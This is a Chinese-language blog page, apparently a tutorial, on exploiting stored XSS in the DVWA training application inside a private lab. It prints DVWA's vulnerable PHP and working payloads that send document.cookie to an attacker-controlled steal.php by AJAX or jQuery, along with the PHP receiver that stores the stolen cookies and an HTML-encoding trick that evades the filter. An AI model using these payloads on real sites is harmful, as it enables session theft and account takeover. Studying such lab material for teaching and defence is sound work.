@@ -1,0 +1,924 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="dvwa学习," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="dvwa存储型xss序通过上一篇对反射型xss的研究和利用，接下来的这篇文章将研究存储型xss并且利用存储型xss编写exploit盗取用户cookie,存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获">
+<meta name="keywords" content="dvwa学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa XSS(Stored)">
+<meta property="og:url" content="http://yoursite.com/2017/12/01/Stored XSS/index.html">
+<meta property="og:site_name" content="Lawliet Blog">
+<meta property="og:description" content="dvwa存储型xss序通过上一篇对反射型xss的研究和利用，接下来的这篇文章将研究存储型xss并且利用存储型xss编写exploit盗取用户cookie,存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/Da2a384Lc9.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/14486Afa3C.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/dj33EKhc54.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/cfKBFBGK30.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/e6hkaL7emi.PNG">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/L07iIIF6i7.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/I4ldm292dl.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/KkIcd8k9D3.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/FLj0Cgld9J.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/4B5HaIC059.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/3blH5g4mId.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/8f5b0eL73E.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/bJelJC9IKK.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/CDf4lk3A5m.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/6id73iIDGk.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/kFf17l0K8f.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/I0cjED1FAK.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/iLEc1fc3B5.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/BikaeL0LGh.png?imageslim">
+<meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/Gib2a8E6jA.png?imageslim">
+<meta property="og:updated_time" content="2017-12-02T11:40:44.237Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dvwa XSS(Stored)">
+<meta name="twitter:description" content="dvwa存储型xss序通过上一篇对反射型xss的研究和利用，接下来的这篇文章将研究存储型xss并且利用存储型xss编写exploit盗取用户cookie,存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获">
+<meta name="twitter:image" content="http://p008biu9n.bkt.clouddn.com/blog/171202/Da2a384Lc9.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/12/01/Stored XSS/"/>
+
+
+
+
+
+  <title>dvwa XSS(Stored) | Lawliet Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lawliet Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">原创文章，未经授权请勿转载</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/01/Stored XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/L-Lawliet.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">dvwa XSS(Stored)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-01T22:32:39+08:00">
+                2017-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="dvwa存储型xss"><a href="#dvwa存储型xss" class="headerlink" title="dvwa存储型xss"></a>dvwa存储型xss</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>通过上一篇对反射型xss的研究和利用，接下来的这篇文章将研究存储型xss并且利用存储型xss编写exploit盗取用户cookie,存储型xss的不同之处在于它可以将用户构造的有害输入直接存储起来，不需要攻击者构造链接诱使受害人点击触发，而是目标网站的用户只要访问插入恶意代码的网站就能触发，相比较反射型xss更为隐蔽，危害更大，受害者也会更多，在这我将介绍几种更为隐蔽的方式获取用户cookie</strong></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>同上次的一样，一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong><br><strong>一台win7虚拟机，ip为192.168.50.150,用来接受漏洞网站的cookie，web由phpstudy搭建</strong></p>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>为了便于理解，代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) {
+    // Get input
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );
+    $name    = trim( $_POST[ &apos;txtName&apos; ] );
+
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Sanitize name input
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    //mysql_close();
+}
+</code></pre><p>?&gt;<br><strong>可以看出对有害输入没有任何过滤，直接将用户提交的内容插入数据库，输入点在两个输入框都有，但是后面的几种难度都对Message域的输入内容进行了htmlspecialchars转义，为了和后面的一致，我们将payload插入Name域测试xss,在此之前用firebug将Name输入框的maxlength改为600，一开始为10，然后输入payload</strong></p>
+<pre><code>Name:&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
+Message:testxss
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/Da2a384Lc9.PNG" alt="mark"><br><strong>简单的一个弹框，弹框可见我们的payload已经储存到了数据库，只要访问该页面的用户都会触发xss</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/14486Afa3C.PNG" alt="mark"><br><strong>下面我们编写payload偷取该网站下用户的cookie，构造payload</strong></p>
+<pre><code>Name:&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt;
+Message:testxss
+</code></pre><p><strong>用script标签加载远程服务器上我们编写的获取cookie的js代码，上一节我们编写的是下面的代码</strong></p>
+<pre><code>document.write(&quot;&lt;form action=&apos;http://192.168.50.150/dvwaxss/steal.php&apos; name=&apos;exploit&apos; method=&apos;post&apos; style=&apos;display:none&apos;&gt;&quot;);
+document.write(&quot;&lt;input type=&apos;hidden&apos; name=&apos;data&apos; value=&apos;&quot;+document.cookie+&quot;&apos;&gt;&quot;);
+document.write(&quot;&lt;/form&gt;&quot;);
+document.exploit.submit();
+</code></pre><p><strong>这段js代码的作用是在页面中构造一个隐藏表单和一个隐藏域，内容为当前的cookie，并且以post方式发送到同目录下的steal.php，但是这种方式有个缺点就是将cookie发送到steal.php后他会刷新页面跳转到steal.php，这样的做法难免会引起用户的怀疑，我们需要用一种更为隐蔽的方式，这里我们用ajax技术，一种异步的javascript,在不刷新页面的前提下神不知鬼不觉的将用户的cookie发送到steal.php</strong></p>
+<pre><code>var url = &quot;http://192.168.50.150/dvwaxss/steal.php&quot;;
+var postStr = &quot;data=&quot;+document.cookie;
+var ajax = null;
+if (window.XMLHttpRequest) {
+    ajax = new XMLHttpRequest();
+} else if (window.ActiveXObject) {
+    ajax = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+} else {
+    ajax=null;
+}
+ajax.open(&quot;POST&quot;, url, true);//true代表异步
+ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+ajax.send(postStr);
+</code></pre><p><strong>上面编写的代码创建了一个ajax对象，构造了一个post请求将用户的cookie作为参数发送到了<code>http://192.168.50.150/dvwaxss/steal.php</code>,也就是当前目录下的steal.php</strong></p>
+<pre><code>&lt;?php
+header(&quot;content-type:text/html;charset=utf-8&quot;);
+$conn=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
+mysql_select_db(&quot;dvwacookie&quot;,$conn);
+if(isset($_GET[&apos;data&apos;]))
+{
+    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_GET[&apos;data&apos;].&quot;&apos;);&quot;;
+    $result=mysql_query($sql,$conn);
+    mysql_close();
+}
+else if(isset($_POST[&apos;data&apos;]))
+{
+    $sql=&quot;insert into low(cookie) values(&apos;&quot;.$_POST[&apos;data&apos;].&quot;&apos;);&quot;;
+    $result=mysql_query($sql,$conn);
+    mysql_close();
+}
+else
+{
+    $sql=&quot;select * from low&quot;;
+    $result=mysql_query($sql,$conn);
+    while($row=mysql_fetch_array($result))
+    {
+        echo &quot;偷取的cookie:&quot;.$row[1].&quot;&lt;/br&gt;&quot;;
+    }
+    mysql_close();
+}
+?&gt;
+</code></pre><p><strong>steal.php将我们获取到的cookie存到数据库中</strong><br><strong>我们先删除目标网站数据中之前我们插入的payload，然后输入</strong></p>
+<pre><code>Name:&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt;
+Message:send cookie use ajax
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/dj33EKhc54.PNG" alt="mark"><br><strong>用src加载远程服务器的js脚本，那么js就是该网站所信任的，那么js的源就会变成加载它的域，从而可以读取该域的数据，比如用户cookie，我们将请求提交后可以看到当前页面将<code>http://192.168.50.150/dvwaxss/cookie.js</code>加载了进来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/cfKBFBGK30.PNG" alt="mark"></p>
+<p><strong>然后观察firebug的javascript控制台，看到</strong></p>
+<pre><code>已拦截跨源请求：同源策略禁止读取位于 http://192.168.50.150/dvwaxss/steal.php 的远程资源。（原因：CORS 头缺少 &apos;Access-Control-Allow-Origin&apos;）
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/e6hkaL7emi.PNG" alt="mark"><br><strong>这是因为ajax严格遵从同源策略，当前加载cookie.js的域为<code>http://192.168.50.128:8080</code>,所以ajax不能读取不同域<code>http://192.168.50.150</code>下的数据，但是cookie已经被发送到了<code>http://192.168.50.150</code>域，steal.php已经将偷取到的cookie存放在了数据库中,而且页面没有刷新，很隐蔽</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/L07iIIF6i7.png?imageslim" alt="mark"><br><strong>还有一种方式，为了更好的兼容浏览器，我们可以使用juery ajax</strong><br><strong>删除目标网站之前的payload，输入</strong></p>
+<pre><code>Name:&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;http://192.168.50.150/dvwaxss/cookie.js&quot;&gt;&lt;/script&gt;
+Message:send cookie use juery ajax
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/I4ldm292dl.png?imageslim" alt="mark"><br><strong>使用juery前要先<code>&lt;script src=&quot;http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js&quot;&gt;&lt;/script&gt;</code>引入</strong><br><strong>由于dvwa中guestbook的name字段有长度限制，为了实验效果，我们用phpmyadmin将name列的varchar改为1000</strong><br><strong>服务端juery代码</strong></p>
+<pre><code>$(document).ready(function(){
+    $.post(&quot;http://192.168.50.150/dvwaxss/steal.php&quot;,{data:document.cookie});
+}
+);
+</code></pre><p><strong>上面的代码同样的构造post请求将cookie作为post参数发送给steal.php</strong><br><strong>然后提交我们的输入</strong><br><strong>可见页面加载了我们的cookie.js</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/KkIcd8k9D3.png?imageslim" alt="mark"><br><strong>同时ajax也执行了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/FLj0Cgld9J.png?imageslim" alt="mark"><br><strong>cookie也被偷取到了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/4B5HaIC059.png?imageslim" alt="mark"></p>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) {
+    // Get input
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );
+    $name    = trim( $_POST[ &apos;txtName&apos; ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    //mysql_close();
+}
+
+?&gt;
+</code></pre><p><strong>主要过滤的地方有</strong></p>
+<pre><code>$message = trim( $_POST[ &apos;mtxMessage&apos; ] );
+$name    = trim( $_POST[ &apos;txtName&apos; ] );    
+$message = htmlspecialchars( $message );
+$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );
+</code></pre><p><strong>对mtxMessage进行了htmlspecialchars转义，但是没有转义txtName，只是把<code>&lt;script&gt;</code>替换为了空，和之前的反射型xss一样，转化为大写<code>&lt;SCRIPT&gt;</code>或者<code>&lt;scr&lt;script&gt;ipt&gt;</code>绕过即可，下面的和low级别利用方式一样，这里不再重复</strong></p>
+<h3 id="high-级别"><a href="#high-级别" class="headerlink" title="high 级别"></a>high 级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;btnSign&apos; ] ) ) {
+    // Get input
+    $message = trim( $_POST[ &apos;mtxMessage&apos; ] );
+    $name    = trim( $_POST[ &apos;txtName&apos; ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );
+    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Update database
+    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &apos;$message&apos;, &apos;$name&apos; );&quot;;
+    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
+
+    //mysql_close();
+}
+
+?&gt;
+</code></pre><p><strong>触发点还是在Name域，和反射型xss high级别的过滤方法一样</strong></p>
+<pre><code>$name    = trim( $_POST[ &apos;txtName&apos; ] );
+$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );
+</code></pre><p><strong>用img标签绕过即可，有不明白的地方参考上一节反射型，编写payload验证xss的存在,输入</strong></p>
+<pre><code>Name:&lt;img src=# onerror=&quot;alert(&apos;xss&apos;)&quot;&gt;
+Message:test xss
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/3blH5g4mId.png?imageslim" alt="mark"><br><strong>弹框，证明有xss的存在</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/8f5b0eL73E.png?imageslim" alt="mark"><br><strong>接下来编写payload获取用户cookie，用firebug将maxlength改为1000，再输入之前先将之前插入数据库的payload删除，然后输入</strong></p>
+<pre><code>Name:&lt;img src=# onerror=&apos;var url=&quot;http://192.168.50.150/dvwaxss/steal.php&quot;;var postStr=&quot;data=&quot;+document.cook&amp;#x69;e;var ajax=null;&amp;#x69;f(w&amp;#x69;ndow.XMLHttpRequest){ajax=new XMLHttpRequest();}else &amp;#x69;f(w&amp;#x69;ndow.Act&amp;#x69;veXObject){ajax=new Act&amp;#x69;veXObject(&quot;M&amp;#x69;crosoft.XMLHTTP&quot;);}else{ajax=null;}ajax.open(&quot;POST&quot;, url, true);ajax.setRequestHeader(&quot;Content-Type&quot;, &quot;appl&amp;#x69;cat&amp;#x69;on/x-www-form-urlencoded&quot;);ajax.send(postStr);&apos;&gt;
+Message:send cookie use ajax
+</code></pre><p><strong>直接在onerror后使用ajax将当前网站用户的cookie用ajax发送到<code>http://192.168.50.150/dvwaxss/steal.php</code>,为了绕过过滤对所有”i”这个字母进行了html编码，为<code>&amp;#x69;</code></strong><br><strong>提交payload</strong><br><strong>查看元素</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/bJelJC9IKK.png?imageslim" alt="mark"><br><strong>查看firebug控制台，有<code>已拦截跨源请求：同源策略禁止读取位于 http://192.168.50.150/dvwaxss/steal.php 的远程资源。（原因：CORS 头缺少 &#39;Access-Control-Allow-Origin&#39;）</code>,可以看出ajax已经执行，将cookie发送到<code>http://192.168.50.150/dvwaxss/steal.php</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/CDf4lk3A5m.png?imageslim" alt="mark"><br><strong>偷取到的cookie被steal.php存入数据库</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/6id73iIDGk.png?imageslim" alt="mark"><br><strong>另外一种方式是利用juery ajax</strong></p>
+<p><strong>编写payload</strong></p>
+<pre><code>Name:&lt;img src=# onerror=&quot;var a=document.createElement(&apos;scr&amp;#x69;pt&apos;); a.setAttr&amp;#x69;bute(&apos;src&apos;, &apos;http://cdn.stat&amp;#x69;c.runoob.com/l&amp;#x69;bs/jquery/1.10.2/jquery.m&amp;#x69;n.js&apos;); document.getElementsByTagName(&apos;head&apos;)[0].appendCh&amp;#x69;ld(a);var b= document.createElement(&apos;scr&amp;#x69;pt&apos;); b.setAttr&amp;#x69;bute(&apos;src&apos;,&apos;http://192.168.50.150/xss_s/cook&amp;#x69;e.js&apos;);
+document.getElementsByTagName(&apos;head&apos;)[0].appendCh&amp;#x69;ld(b);&quot;&gt;
+Message:send cookie use juery ajax
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/kFf17l0K8f.png?imageslim" alt="mark"><br><strong>同样的为了绕过过滤对所有的字母”i”进行html编码</strong><br><strong>onerror里的js代码是利用javascript DOM操作动态创造script标签，然后用setAttribute给src赋值，分别加载<code>http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js</code>和<code>http://192.168.50.150/xss_s/cookie.js</code></strong><br><strong><code>http://192.168.50.150/xss_s/cookie.js</code>代码为</strong></p>
+<pre><code>$(document).ready(function(){
+$.post(&quot;http://192.168.50.150/dvwaxss/steal.php&quot;,{data:document.cookie});
+}
+);
+</code></pre><p><strong>和上面的一样</strong><br><strong>提交payload</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/I0cjED1FAK.png?imageslim" alt="mark"><br><strong>javascript DOM操作已经在页面重新加载时在head标签下创造了两个script标签去加载js脚本</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/iLEc1fc3B5.png?imageslim" alt="mark"><br><strong>cookie已经发送给了<code>http://192.168.50.150/dvwaxss/steal.php</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/BikaeL0LGh.png?imageslim" alt="mark"><br><strong>被steal.php存入数据库</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171202/Gib2a8E6jA.png?imageslim" alt="mark"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/dvwa学习/" rel="tag"># dvwa学习</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/28/Reflected XSS/" rel="next" title="dvwa XSS(Reflected)">
+                <i class="fa fa-chevron-left"></i> dvwa XSS(Reflected)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/12/21/DOM XSS/" rel="prev" title="dvwa XSS(DOM)">
+                dvwa XSS(DOM) <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
